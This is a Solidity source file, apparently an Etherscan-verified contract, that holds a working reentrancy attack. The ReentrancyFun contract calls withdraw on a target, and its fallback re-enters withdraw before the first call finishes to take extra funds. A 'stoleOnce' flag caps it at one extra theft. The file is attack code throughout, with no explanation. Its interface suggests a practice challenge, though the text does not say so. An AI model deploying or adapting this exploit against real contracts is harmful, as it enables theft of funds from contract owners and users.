/**
 *Submitted for verification at Etherscan.io on 2022-09-09
*/

// File: contracts/ReentrancyInterface.sol

pragma solidity >=0.8.0 <0.9.0;

interface ReentrancyInterface {
  function withdraw (uint _amount) external;
  function donate(address _to) external payable;
  function balanceOf(address _who) external view returns (uint balance);
}
// File: contracts/Reentrancyfun.sol

pragma solidity >= 0.8.0 < 0.9.0;


contract ReentrancyFun{
    uint256 amount = 1000000000000000;

    function withdraw(address payable _from) public {
        ReentrancyInterface(_from).withdraw(amount);
    }

    bool public stoleOnce = false;

    function resetStoleOnce() public {
        stoleOnce = false;
    }

    fallback() external payable{
        if(!stoleOnce){
            ReentrancyInterface(msg.sender).withdraw(amount);
            stoleOnce = true;
        }
    }
}